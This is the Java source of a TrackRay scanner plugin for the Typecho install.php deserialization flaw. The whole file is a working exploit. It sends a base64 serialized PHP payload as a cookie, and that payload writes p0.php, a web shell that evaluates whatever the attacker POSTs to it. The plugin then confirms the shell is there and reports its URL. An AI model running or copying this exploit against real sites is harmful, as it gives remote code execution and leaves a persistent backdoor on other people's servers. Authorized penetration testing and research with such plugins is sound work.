package com.trackray.module.plugin.webapp.typecho;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;
import com.trackray.base.utils.PageUtils;

import java.util.Map;

@Plugin(value = "typecho001",
        title = " Typecho install.php 反序列化导致任意代码执行", desc = "target=http://xxx.com/",
        author = "浅蓝", link = "https://paper.seebug.org/424/")
@Rule(params = {@Param(key = "target", desc = "目标地址"),} , type = CommonPlugin.Type.TEXT)
public class Typecho001 extends CommonPlugin<String> {
    String file = "/install.php";
    String url ="/install.php?finish=1";
    String payload = "__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==";

    @Override
    public boolean check(Map param) {
        /*crawlerPage.getRequest().setUrl(param.get("target")+file);
        fetcher.run(crawlerPage);
        if (crawlerPage.getResponse().getStatus().getStatusCode() ==200){
            return true;
        }
        result = "install.php文件不存在";
        return false;*/
        return true;
    }

    @Override
    public String start() {
        crawlerPage.getRequest().setUrl(param.get("target")+url);
        crawlerPage.getRequest().addHttpHeader("Referer",param.get("target")+file);
        crawlerPage.getRequest().setCookie(payload);
        fetcher.run(crawlerPage);
        String content = PageUtils.getContent(crawlerPage);
        crawlerPage.getRequest().setUrl(param.get("target")+"/p0.php");
        fetcher.run(crawlerPage);
        if (crawlerPage.getResponse().getStatus().getStatusCode() == 200){
            return param.get("target")+"/p0.php POST:p0=phpinfo();";
        }
        return "漏洞可能不存在";
    }

}
